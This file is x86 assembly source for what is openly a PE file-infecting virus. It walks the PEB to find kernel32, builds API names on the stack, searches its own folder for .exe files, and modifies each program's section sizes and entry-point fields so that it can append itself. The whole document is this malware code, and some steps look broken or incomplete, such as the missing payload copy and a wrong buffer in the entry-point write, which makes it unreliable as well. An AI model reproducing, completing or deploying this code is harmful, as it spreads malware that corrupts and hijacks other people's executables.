;EasyCodeName=Project4,1
.386
Option CaseMap:None

.Code
start:
payload:
	Assume Fs:Nothing
	Sub Esp, 400H
	Xor Eax, Eax
	Mov [Ebp - 4H], Eax			; This will store the number of exported function in kernel32.dll
	Mov [Ebp - 8H], Eax			; This will store the address of exported table
	Mov [Ebp - 0CH], Eax		; This will store the address of exported name table
	Mov [Ebp - 10H], Eax		; This will store the address of ordinal table
	Mov [Ebp - 14H], Eax		; This will store the address of GetProcAddress
	Mov [Ebp - 18H], Eax		; This will store the address of LoadLibraryA
	Mov [Ebp - 1CH], Eax		; This will store CreateFileMappingA base address
	Mov [Ebp - 20H], Eax		; This will store CreateFile base address
	Mov [Ebp - 24H], Eax		; This will store FindFirstFileA base address
	Mov [Ebp - 28H], Eax		; This will store FindNextFileA base address
	Mov [Ebp - 2CH], Eax		; This will store SetFilePointer() base address
	Mov [Ebp - 30H], Eax		; This will store WriteFile() base address
	Mov [Ebp - 34H], Eax		; This will store lstrcpyA base address
	Mov [Ebp - 38H], Eax		; This will store lstrcmpA base address
	Mov [Ebp - 3CH], Eax		; This will store GetModuleFileNameA address
	Mov [Ebp - 40H], Eax		; This will store lstrlenA address
	Mov [Ebp - 44H], Eax		; This will store lstrcatA address
	Mov [Ebp - 48H], Eax		; This will store FindFirstFileA handle
	Mov [Ebp - 4CH], Eax		; File handle
	Mov [Ebp - 50H], Eax		; File mapping handle
	Mov [Ebp - 54H], Eax		; This will store MapViewOfFile base address
	Mov [Ebp - 58H], Eax		; Injected file base address
	Mov [Ebp - 5CH], Eax		; This will store jump back entry point
	Mov [Ebp - 60H], Eax
	Mov [Ebp - 64H], Eax		; General purposes buffer
	Mov [Ebp - 68H], Eax		; General purposes buffer
	Mov [Ebp - 6CH], Eax		; BytesWritten
	Mov [Ebp - 90H], Eax		; This will store ExitProcess address
	Mov [Ebp - 150H], Eax		; This will store the path of the running exe
	Mov [Ebp - 200H], Eax		; This will store the path of the target file
	Mov [Ebp - 300H], Eax		; This will store the path of the current directory
	Mov [Ebp - 400H], Eax		; LPWIN32_FIND_DATAA

	Mov Ax, 7373H
	Push Eax
	Push 65726464H
	Push 41636F72H
	Push 50746547H
	Mov [Ebp - 14H], Esp		; Push GetProcAddress

	Mov Eax, [Fs:30H]			; PEB
    Mov Eax, [Eax + 0CH]		; PEB_LDR_DATA
    Mov Eax, [Eax + 14H]		; InMemoryOrderModuleList
    Mov Eax, [Eax]				; Get pointer to the second (ntdll.dll) entry in InMemoryOrderModuleList
    Mov Eax, [Eax]				; Get pointer to the third (kernel32.dll) list in InMemoryOrderModuleList
    Mov Eax, [Eax + 10H]
	Mov Ebx, Eax				; Store kernel32.dll base address in ebx

	Mov Eax, [Ebx + 3CH]
	Add Eax, Ebx				; PE signature

	Mov Eax, [Eax + 78H]
	Add Eax, Ebx				; Address of Export Table

	; Get number of exported functions
	Mov Ecx, [Eax + 14H]
	Mov [Ebp - 4H], Ecx

	; Get address of functions
	Mov Ecx, [Eax + 1CH]
	Add Ecx, Ebx
	Mov [Ebp - 8H], Ecx

	; Get address of name table
	Mov Ecx, [Eax + 20H]
	Add Ecx, Ebx
	Mov [Ebp - 0CH], Ecx

	; Get address of ordinal table
	Mov Ecx, [Eax + 24H]
	Add Ecx, Ebx
	Mov [Ebp - 10H], Ecx

	Xor Eax, Eax			; Counter for loop
	Xor Ecx, Ecx

getFunctionPosition:
	Mov Esi, [Ebp - 14H]	; Name of Function
	Mov Edi, [Ebp - 0CH]	; Pointer points to the start of name table
	Mov Edi, [Edi + Eax * 4]; RVA of next function name
	Add Edi, Ebx

	Mov Cx, 8
	Repe Cmpsb				; Compare edi, esi
	Jz getGetProcAddress	; If found the name then jump to getGetProcAddress
	Inc Eax
	Cmp Eax, [Ebp - 4H]		; Check for if counter < number of functions
	Jne getFunctionPosition ; Loop

; Calculate the ordinal of the function: (Address of ordinal table + position * sizeof(Ordinal))
; After got the ordinal then calculate the RVA of the function address: (RVA AddressOfFunction + ordinal * sizeof(FunctionRVA))
getGetProcAddress:
	Xor Ecx, Ecx
	Mov Ecx, [Ebp - 10H]		; Address of ordinal table
	Mov Edx, [Ebp - 8H]			; Address of function

	Mov Ax, [Ecx + Eax * 2]		; Get the function ordinal
	Mov Eax, [Edx + Eax * 4]
	Add Eax, Ebx				; Function address
	Jmp getFunctionAddress

; Using GetProcAddress to get the address of LoadLibraryA
; This part is used to find necessary libraries and functions
getFunctionAddress:
	Xor Ecx, Ecx
	Xor Edx, Edx
	Mov Esi, Eax				; Move GetProcAddress base to esi
	Mov [Ebp - 14H], Esi		; Saving base address of GetProcAddress
	Push Ecx
	Push 41797261H				; aryA
	Push 7262694CH				; Libr
	Push 64616F4CH				; Load
	Push Esp
	Push Ebx
	Call Esi					; Call GetProcAddress
	Mov [Ebp - 18H], Eax		; Saving LoadLibraryA address

	; Load CreateFileMappingA
	Add Esp, 0CH
	Xor Ecx, Ecx
	Mov Cx, 4167H
	Push Ecx
	Push 6E697070H
	Push 614D656CH
	Push 69466574H
	Push 61657243H
	Push Esp					; "CreateFileMappingA"
	Push Ebx
	Call Esi
	Mov [Ebp - 1CH], Eax		; Saving CreateFileMappingA address

	; Load CreateFile
	Add Esp, 14H
	Push 6141656CH
	Sub DWord Ptr [Esp + 3H], 61H
	Push 69466574H
	Push 61657243H
	Push Esp					; "CreateFileA"
	Push Ebx
	Call Esi					; Call GetProcAddress
	Mov [Ebp - 20H], Eax		; Saving CreateFile address

	; Load FindFirstFileA
	Add Esp, 0CH				; Clear CreateFile from the stack
	Xor Ecx, Ecx
	Mov Cx, 4165H
	Push Ecx
	Push 6C694674H
	Push 73726946H
	Push 646E6946H
	Push Esp 					; "FindFirstFileA"
	Push Ebx					; kernel32.dll base address
	Call Esi					; GetProcAddress
	Mov [Ebp - 24H], Eax		; Saving FindFirstFileA address

	; Get FindNextFileA address
	Add Esp, 10H				; Clear FindFirstFileA from the stack
	Xor Ecx, Ecx
	Mov Cl, 41H
	Push Ecx
	Push 656C6946H
	Push 7478654EH
	Push 646E6946H
	Push Esp
	Push Ebx
	Call Esi					; GetProcAddress
	Mov [Ebp - 28H], Eax		; Saving FindNextFileA base address

	; Load SetFilePointer address
	Add Esp, 10H
	Xor Ecx, Ecx
	Mov Cx, 7265H
	Push Ecx
	Push 746E696FH
	Push 50656C69H
	Push 46746553H
	Push Esp					; "SetFilePointer"
	Push Ebx
	Call Esi					; Call GetProcAddress
	Mov [Ebp - 2CH], Eax		; Saving SetFilePointer address

	; Load WriteFile address
	Add Esp, 10H				; Clear "SetFilePointer"
	Xor Ecx, Ecx
	Mov Cl, 65H
	Push Ecx
	Push 6C694665H
	Push 74697257H
	Push Esp					; "WriteFile"
	Push Ebx
	Call Esi
	Mov [Ebp - 30H], Eax		; Saving WriteFile address

	; Load lstrcpyA address
	Add Esp, 0CH				; Clear WriteFile from the stack
	Xor Ecx, Ecx
	Push Ecx
	Push 41797063H
	Push 7274736CH
	Push Esp 					; "lstrcpyA"
	Push Ebx
	Call Esi					; GetProcAddress
	Mov [Ebp - 34H], Eax		; Saving lstrcpyA base address

	; Load lstrcmpA
	Add Esp, 8H
	Push 41706D63H
	Push 7274736CH
	Push Esp					; "lstrcmpA"
	Push Ebx
	Call Esi
	Mov [Ebp - 38H], Eax		; Saving lstrcmpA base address

	; Load GetModuleFileNameA
	Add Esp, 8H
	Xor Ecx, Ecx
	Mov Cx, 4165H
	Push Ecx
	Push 6D614E65H
	Push 6C694665H
	Push 6C75646FH
	Push 4D746547H
	Push Esp					; "GetModuleFileNameA"
	Push Ebx
	Call Esi
	Mov [Ebp - 3CH], Eax		; Saving GetModuleFileNameA base address

	; Load lstrlenA
	Add Esp, 14H
	Xor Ecx, Ecx
	Push Ecx
	Push 416E656CH
	Push 7274736CH
	Push Esp					; "lstrlenA"
	Push Ebx
	Call Esi
	Mov [Ebp - 40H], Eax

	; Load lstrcatA
	Add Esp, 8H
	Xor Ecx, Ecx
	Push Ecx
	Push 41746163H
	Push 7274736CH
	Push Esp					; "lstrcatA"
	Push Ebx
	Call Esi
	Mov [Ebp - 44H], Eax

	; Load MapViewOfFile
	Add Esp, 8H
	Xor Ecx, Ecx
	Mov Cl, 65H
	Push Ecx
	Push 6C694666H
	Push 4F776569H
	Push 5670614DH
	Push Esp					; "MapViewOfFile"
	Push Ebx
	Call Esi
	Mov [Ebp - 54H], Eax

	; Load ExitProcess
	Add Esp, 10H
	Push 61737365H
	Sub DWord Ptr [Esp + 3H], 61H
	Push 636F7250H
	Push 74697845H
	Push Esp					; "ExitProcess"
	Push Ebx
	Call Esi
	Mov [Ebp - 90H], Eax

	; Retrieve the path of the current process
	Xor Eax, Eax
	Xor Ebx, Ebx
	Mov Ax, 0C8H
	Push Eax					; nSize = 200 bytes
	Lea Eax, [Ebp - 150H]
	Push Eax					; lpFileName
	Push Ebx					; hModule = NULL
	Mov Eax, [Ebp - 3CH]
	Call Eax					; GetModuleFileNameA

	; Copy the path from [ebp - 150H] to [ebp - 200H]
	Lea Eax, [Ebp - 150H]
	Push Eax
	Lea Eax, [Ebp - 200H]
	Push Eax
	Mov Eax, [Ebp - 34H]
	Call Eax					; Call lstrcpyA

	Call find_last_backslash	; Remove the last backslash to get the directory from the path
	Lea Edx, [Ebp - 200H]
	Push Edx					; lpString2
	Lea Ebx, [Ebp - 300H]
	Push Ebx					; lpString1
	Mov Eax, [Ebp - 34H]
	Call Eax					; Call lstrcpyA

	; Find all exe files in the directory
	Mov Eax, [Ebp - 40H]
	Lea Edx, [Ebp - 300H]
	Push Edx
	Call Eax					; Call lstrlenA

	Add Edx, Eax
	Mov Byte Ptr [Edx], 2AH		; "*"
	Inc Edx
	Mov Byte Ptr [Edx], 2EH		; "."
	Inc Edx
	Mov Byte Ptr [Edx], 65H		; "e"
	Inc Edx
	Mov Byte Ptr [Edx], 78H		; "x"
	Inc Edx
	Mov Byte Ptr [Edx], 65H		; "e"
	Inc Edx
	Mov Byte Ptr [Edx], 0H		; null

	Lea Eax, [Ebp - 400H]
	Push Eax
	Lea Eax, [Ebp - 300H]
	Push Eax					; "Path\To\CurrentDirectory\*.exe"
	Mov Eax, [Ebp - 24H]
	Call Eax					; Call FindFirstFileA
	Mov [Ebp - 48H], Eax

process_files_loop:
	; Cut the name of the exe file returned from FindFirstFileA
	; And append it to the current directory using lstrcatA => path to the exe file
	Lea Eax, [Ebp - 400H + 2CH]	; cFileName
	Push Eax					; [in] lpString2 : Name of the exe file
	Lea Eax, [Ebp - 200H]
	Push Eax					; [in, out] lpString1 : This will hold the address of the file for injection
	Mov Eax, [Ebp - 44H]
	Call Eax					; Call lstrcatA

	; Compare the constructed path with the current process path
	Lea Eax, [Ebp - 200H]		; Path to the target exe
	Push Eax
	Lea Eax, [Ebp - 150H]		; Path of the running process
	Push Eax
	Mov Eax, [Ebp - 38H]
	Call Eax					; Call lstrcmpA

	; If identical, skip to next file
	Test Eax, Eax
	Je infect_next_file

	; If not identical, proceed with injecting
	Call InjectingFile

infect_next_file:
	; Move on to the next exe file
	Call find_last_backslash	; Remove the last backslash to get the directory from the path
	Lea Edi, [Ebp - 400H]
	Mov Eax, [Ebp - 48H]		; FindFirstFileA handle
	Push Edi					; LPWIN32_FIND_DATAA
	Push Eax
	Mov Eax, [Ebp - 28H]
	Call Eax					; Call FindNextFileA

	; Check if there are more files to process
	Cmp Eax, 0
	Jne process_files_loop

	; No more file, jump to exit
	Jmp exit

find_last_backslash:
	; Find the last backslash in the path and null-terminate the string
	Xor Edx, Edx
	Mov Eax, [Ebp - 40H]		; Load lstrlenA address to eax
	Lea Edx, [Ebp - 200H]		; Path to the current exe
	Push Edx
	Call Eax                    ; Size of the path => eax
	Add Edx, Eax                ; Point edx to the end of the string
	Dec Edx

find_backslash_loop:
	Cmp Byte Ptr [Edx], 5CH     ; 5C = "\"
	Je found_backslash			; If found then jump to next step
	Dec Edx						; Else, keep decreasing until the "\" is found
	Jmp find_backslash_loop		; Loop

found_backslash:
	Mov Byte Ptr [Edx + 1H], 0H ; Null-terminate the string at the last backslash
	Ret

InjectingFile:
	Xor Ecx, Ecx
	Xor Eax, Eax
	Xor Edx, Edx
	Lea Eax, [Ebp - 200H]
	Push Ecx					; hTemplatefile (NULL)
	Push Ecx					; dwFlagsAndAttributes (NULL)
	Push 3H						; dwCreationDisposition (OPEN_EXISTING)
	Push Ecx					; lpSecurityAttributes (NULL)
	Push 1H						; dwShareMode (FILE_SHARE_READ)
	Push 0C0000000H				; dwDesiredAccess (GENERIC_WRITE or GENERIC_READ)
	Push Eax					; lpFilePath
	Mov Eax, [Ebp - 20H]
	Call Eax					; Call CreateFileA
	Cmp Eax, 0FFFFFFFFH			; Check if handle is valid
	Mov [Ebp - 4CH], Eax		; Store the file handle

	Je exit
	Push Eax					; Map the file into the memory

	Push Edx					; NULL
	Push Edx					; 0
	Push Edx					; 0
	Push 4H						; PAGE_READWRITE
	Push Edx					; lpFileMappingAttributes = 0
	Push Eax					; fileHandle
	Mov Eax, [Ebp - 1CH]
	Call Eax					; Call CreateFileMappingA

	; Check if mapping handle is valid
	Cmp Eax, Ecx
	Je exit
	Mov [Ebp - 50H], Eax		; Store mapping handle
	Mov Ecx, Eax

	; Get the address of the mapped file
	Xor Ebx, Ebx
	Push Ebx
	Push Ebx
	Push Ebx
	Push 2H						; dwDesiredAccess = FILE_MAP_WRITE
	Push Ecx
	Mov Eax, [Ebp - 54H]
	Call Eax					; Call MapViewOfFile

	; Check if mapping address is valid
	Cmp Eax, Ebx
	Je exit
	Mov Ebx, Eax				; Base address of the infected file
	Mov [Ebp - 58H], Eax		; Save the base address

	Mov Edi, [Ebx + 3CH]
	Add Edi, Ebx				; PE signature

	Mov Eax, [Edi + 3CH]
	Mov [Ebp - 64H], Eax		; FileAlignment

	Mov Eax, [Edi + 38H]
	Mov [Ebp - 68H], Eax		; SectionAlignment

	Mov Eax, [Edi + 28H]		; AddressOfEntryPoint
	Mov Edx, [Edi + 34H]		; ImageBase
	Add Eax, Edx
	Mov [Ebp - 5CH], Eax		; Jump back entry point

	Mov Eax, [Edi + 50H]
	Mov [Ebp - 60H], Eax		; SizeOfImage

	Mov Ax, [Edi + 6H]			; Number of section
	Add Edi, 0F8H				; Skip through Optional Header
	Sub Ax, 1
	Mov Dx, 40
	IMul Ax, Dx
	Movzx Eax, Ax
	Add Edi, Eax				; Move to the last section info in section table

	Mov Eax, [Edi + 8H]			; Move to the last section virtual size
	Mov Edx, payloadSize
	Add Eax, Edx
	Mov Edx, [Ebp - 68H]
	Dec Edx
	Add Eax, Edx
	Not Edx
	And Eax, Edx
	Mov [Ebp - 68H], Eax		; Update last section virtual size and save to stack
	Mov Edx, Edi
	Add Edx, 8H
	Sub Edx, Ebx

	; Increase virtual size of the last section
	Mov Esi, [Ebp - 4CH]		; ecx = FileHandle
	Mov Eax, [Ebp - 2CH]		; eax = adrress of SetFilePointer
	Xor Ecx, Ecx
	Push Ecx					; FILE_BEGIN
	Push Ecx					; NULL
	Push Edx
	Push Esi					; FileHandle
	Call Eax					; Call SetFilePointer

	Mov Ebx, [Ebp - 30H]		; ebx = address of WriteFile
	Lea Eax, [Ebp - 6CH]
	Xor Ecx, Ecx
	Push Ecx
	Push Eax					; lpNumberOfBytesWritten
	Push 4H
	Lea Eax, [Ebp - 68H]
	Push Eax					; lpBuffer
	Push Esi					; FileHandle
	Call Ebx					; Call WriteFile

	; Increase raw size of the last section
	Mov Eax, [Edi + 10H]		; Move to last section raw size
	Mov Edx, payloadSize
	Add Eax, Edx
	Mov Edx, [Ebp - 64H]		; FileAlignment
	Dec Edx
	Add Eax, Edx
	Not Edx
	And Eax, Edx
	Mov [Ebp - 64H], Eax		; Save new raw size to buffer

	; Move pointer to last section raw size
	Mov Edx, Edi
	Add Edx, 10H
	Sub Edx, [Ebp - 58H]
	Mov Eax, [Ebp - 2CH]		; eax = adrress of SetFilePointer
	Xor Ecx, Ecx
	Push Ecx					; FILE_BEGIN
	Push Ecx					; NULL
	Push Edx
	Push Esi					; FileHandle
	Call Eax					; Call SetFilePointer

	; Update raw size
	Lea Eax, [Ebp - 6CH]
	Xor Ecx, Ecx
	Push Ecx
	Push Eax					; lpNumberOfBytesWritten
	Push 4H
	Lea Eax, [Ebp - 64H]
	Push Eax					; lpBuffer
	Push Esi					; FileHandle
	Call Ebx					; Call WriteFile

	; Calculate new AddressOfEntryPoint
	Mov Eax, [Edi + 0CH]		; VirtualAdress
	Mov Ecx, [Ebp - 68H]		; VirtualSize
	Add Eax, Ecx
	Mov Ecx, payloadSize
	Sub Eax, Ecx

	Mov Edi, [Ebp - 58H]		; Base address
	Mov Edx, [Edi + 3CH]
	Add Edx, Edi				; Move back to PE signature

	; Move pointer to last section raw size
	Add Edx, 28H
	Sub Edx, Edi
	Sub Edx, [Ebp - 58H]
	Mov Eax, [Ebp - 2CH]		; eax = adrress of SetFilePointer
	Xor Ecx, Ecx
	Push Ecx					; FILE_BEGIN
	Push Ecx					; NULL
	Push Edx
	Push Esi					; FileHandle
	Call Eax					; Call SetFilePointer

	; Update raw size
	Lea Eax, [Ebp - 6CH]
	Xor Ecx, Ecx
	Push Ecx
	Push Eax					; lpNumberOfBytesWritten
	Push 4H
	Lea Eax, [Ebp - 64H]
	Push Eax					; lpBuffer
	Push Esi					; FileHandle
	Call Ebx					; Call WriteFile

exit:
	Xor Ebx, Ebx
	Mov Eax, [Ebp - 90H]
	Push Ebx					; 0
	Call Eax					; ExitProcess

payloadSize = $ -payload

End start
